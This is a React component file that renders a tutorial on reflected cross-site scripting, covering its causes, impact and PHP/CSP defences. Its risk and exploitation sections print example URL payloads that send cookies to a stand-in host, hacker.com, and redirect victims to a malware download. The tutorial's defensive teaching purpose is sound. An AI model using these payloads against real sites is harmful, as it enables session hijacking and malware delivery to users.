
import "./article.css"
import ScrollToTop from "../scrollToTop/scrollToTop";
import CodeBlock from "./CodeBlock";
import Header from "./shared/header"
import Auther from "./shared/auther"
import Aside from "./shared/aside"
import ArticlePart from "./shared/articlePart"
import Footer from "./shared/footer"


export default function XSS() {
  return (
    <>
      <ScrollToTop/> {/* Scroll To Top Button */}
      <Header articleName="Reflected XSS" LabName="Reflected XSS Labs"/>
      <Auther autherName="Waleed Sameer" readTime="5" imageSrc="/imgs/hacker.png"> <span>Reflected</span> <span>C</span>ross <span>S</span>ite <span>S</span>cripting</Auther>
      <Aside/>
      <ArticleContent/>
    </>
  )
}

function ArticleContent() {
  return (
      <>
        <article>
          <ArticlePart className="bug-definition">
            <h4>1. What's The Reflected-XSS Vulnerability ?</h4>
            <div>
              <p>
                Reflected Cross-Site Scripting (XSS) is a type of XSS vulnerability 
                <br/>
                <b>where an attacker injects a malicious script into a URL</b>
                , and <b>the payload is immediately "reflected" back in the response.</b>
                <br/>
                it only <b>executes when a user interacts with a malicious link.</b>
                <br/>
                <br/>
                Then, it <b>requires social engineering</b>  to tricking users into clicking a malicious URL.
                <br/>
                Reflected XSS is often <b>used in phishing attacks and browser hijacking attempts</b>.
                <br/>
                <br/>
                These scripts are then <b>executed in the victim's browser</b>, leading to: 
              </p> 
              <ul>
                <li><b>Stealing sensitive information</b> (cookies, session tokens).</li>
                <li><b>Defacing websites or modifying their behavior.</b></li>
                <li><b>Performing unauthorized actions on behalf of users.</b></li>
              </ul>
              <p>Example in simple terms: Imagine a search box on a website where a user can enter :</p>
              <CodeBlock language={"url"} code={`https://site.com/vulnerable.php?search=<script>alert(document.cookie)</script>`}/>
              <p>and it pops up an alert when page loaded, Then it's Reflected XSS!</p>
            </div>
          </ArticlePart>


          <ArticlePart className="when-happens">
            <h4>2. When and Why Does XSS Happen?</h4>
            <div>
              <p>Refleced XSS occurs <b>when a web application fails to properly validate, sanitize the user input from URL Parameters.</b> 
                <br/>
                <br/>
                Reflected XSS, It can happen in Unfiltered Fields Like:
              </p>
              <ul>
                <li>Accepts user input From <b>URL Parameters</b> </li>
                <li><b>reflect user inputs back in the response</b> without proper sanitization.</li>
                <li>The <b>Error messages</b> displaying user input in the response.</li>
              </ul>
              <p>Why does this happen?</p>
              <ul>
                <li><b>Developers trust user input too much.</b></li>
                <li><b>The application directly renders user-generated content without escaping characters.</b></li>
              </ul>
            </div>
          </ArticlePart>

          <ArticlePart className="risks-impact">
            <h4>3.  What're The Risks and Impact of Reflected-XSS ?</h4>
            <div>
              <p>
                Even though Reflected XSS requires user interaction, it can still lead to severe security threats, including:
                <br/></p>
              <ul>
                <li><b>Session Hijacking</b>, Stealing session cookies to hijack user accounts.
                <CodeBlock language={"url"} code={`https://site.com/vulnerable.php?search=<script>document.location=\`http://hacker.com/steal.php?cookie=\${document.cookie}\`</script>`}/>
                </li>
                <li><b>Phishing Attacks</b> - Injecting fake login forms to steal credentials.</li>
                <li><b>Defacing Websites</b> - Altering the content of a webpage.</li>
                <li><b>Spreading Malware</b> - Injecting malicious scripts to download trojans.</li>
                <li><b>Exploiting Admin Panels</b> - If an admin views the infected page, their session possible to hijack.</li>
              </ul>
            </div>
          </ArticlePart>

          <ArticlePart className="real-exploitation">
            <h4>4. What're Real Scenarios and Exploitation Examples ?</h4>
            <div>
              <ul>
                <li>
                  <b>Bypassing CSRF Protection</b> - Exploiting an XSS vulnerability to perform CSRF attacks.
                </li>
                <br/>
                <li>
                  <b>Stealing Cookies</b> 
                  <CodeBlock language={"url"} code={`https://site.com/vulnerable.php?search=<script>document.location=\`http://hacker.com/steal.php?cookie=\${document.cookie}&userAgent=\${navigator.userAgent}\`</script>`}/>
                  This sends the victim’s cookies to an attacker-controlled server.
                </li>
                <li>
                  <b>Injecting Malicious JavaScript Code</b> to download trojans!
                  <CodeBlock language={"url"} code={`https://site.com/valunerable?search=<script>document.location="https://hacker.com/malware.exe"</script>`}/>
                </li>
              </ul>
            </div>

          </ArticlePart>
          
          <ArticlePart className="fix-prevent">
            <h4>5. How to Fix & Secure Your Website ?</h4>
            <div>
              <ul>
                <li>
                  <b>Sanitize & Escape User Input</b>
                  <b>In PHP</b>, Use <b>htmlspecialchars </b> function.
                  <CodeBlock language={"php"} code={`htmlspecialchars($_GET["userInput"]);`}/>
                  <br/>
                </li>
                <li>
                  <b>Use HttpOnly & Secure Flags on Cookies, by setcookie function</b>
                  <br/>
                  <br/>
                  <CodeBlock language={"php"} code={`setcookie("user_session", "random_value", [\n  'expires' => strtotime("+1 Month"),\n  'path' => '/',\n  'domain' => '',\n   'secure' => true, // [-] Only send over HTTPS\n  'httponly' => true, // [-] JavaScript cannot access this cookie\n  'samesite' => 'Strict' // [-] Prevents CSRF attacks\n]);`}/>
                </li>
                <br/>
                <li>
                  <b>Use HttpOnly & Secure Flags on Cookies, but globally by edit php.ini</b>
                  <br/>
                  <br/>
                  <CodeBlock language={"ini"} code={`# [-] Now, This applies security settings globally for all PHP sessions.\n\nsession.cookie_secure = 1\nsession.cookie_httponly = 1\nsession.cookie_samesite = "Strict"\n`}/>
                </li>
                <br/>
                <li>
                  <b>Set a Strong Content Security Policy (CSP), by Set CSP headers to restrict scripts </b>
                  <br/>
                  <br/>
                  <CodeBlock language={"http"} code={`Content-Security-Policy: default-src 'self'; script-src 'self';`}/>
                  <br/>
                </li>
              </ul>
            </div>
          </ArticlePart>

          <ArticlePart className="conclusion-resources">
            <h4>- The Conclusion & Additional Resources</h4>
            <div>
              <h3>The Conclusion</h3>
              <br/>
              Reflected XSS is a dangerous attack vector because it can be used in <b>targeted phishing campaigns and credential theft.</b>
              <br/>
              <b>it requires user interaction</b>, but when combined with social engineering, it can be just as devastating.
              understanding XSS Vulnerability types is essential in web security.
              <br/>
              <b>Never ever trust user input. Always escape, sanitize, and validate! 🛡️</b>
              <br/>
              <br/>
              <h3>Additional Resources</h3>
              <br/>
              <ul>
                <li>
                  <b>
                    <a href="https://portswigger.net/web-security/all-labs#cross-site-scripting" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Portswigger XSS Labs</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >OWASP XSS Cheat Sheet</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://xss-game.appspot.com/" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Google XSS Game</a>
                    </b>
                </li>
                <li>
                  <b>
                    <a href="https://www.google.com/search?q=bug+bounty+reports+on+xss+intitle+medium" 
                      target="_blank"
                      style={{color: "#2626f8",textDecoration: "underline"}}
                      >Bug Bounty Reports</a>
                    </b>
                </li>
              </ul>
            </div>
          </ArticlePart>

          <ArticlePart className="good-bye">
          <h4>🟡 Last but not Least!</h4>
            <div>
              <p style={{fontWeight: "bold"}}>"Think like an attacker, defend like a guardian! The best security expert is the one who never stops learning! "</p>
              <br/>
              <p style={{color: "var(--main-color)", fontFamily: 'heading-font',fontWeight: "bold"}}>
                <a href="https://facebook.com/fandeta7"
                target="_blank"
                style={{color: "var(--main-color)", textDecoration: "underline"}}>Fandeta</a> was here!</p>
            </div>

          </ArticlePart>
        </article>
        <Footer/>
      </>
  )
}

